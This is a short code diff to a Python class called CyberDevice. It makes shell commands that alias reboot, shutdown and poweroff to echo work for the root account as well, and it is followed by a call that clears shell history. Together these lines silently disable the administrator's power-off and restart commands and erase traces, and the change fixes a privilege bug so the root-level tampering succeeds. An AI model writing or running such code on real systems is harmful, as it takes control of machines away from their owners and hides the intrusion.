@@ -131,9 +131,9 @@ class CyberDevice:
         self.execute("echo \"alias shutdown='echo'\" >> ~/.bashrc")
         self.execute("echo \"alias poweroff='echo'\" >> ~/.bashrc")
 
-        self.execute("sudo echo \"alias reboot='echo'\" >> /root/.bashrc")
-        self.execute("sudo echo \"alias shutdown='echo'\" >> /root/.bashrc")
-        self.execute("sudo echo \"alias poweroff='echo'\" >> /root/.bashrc")
+        self.execute("echo 'echo \"alias reboot=echo\" >> /root/.bashrc' | sudo bash")
+        self.execute("echo 'echo \"alias shutdown=echo\" >> /root/.bashrc' | sudo bash")
+        self.execute("echo 'echo \"alias poweroff=echo\" >> /root/.bashrc' | sudo bash")
 
         self.clear_history()
 
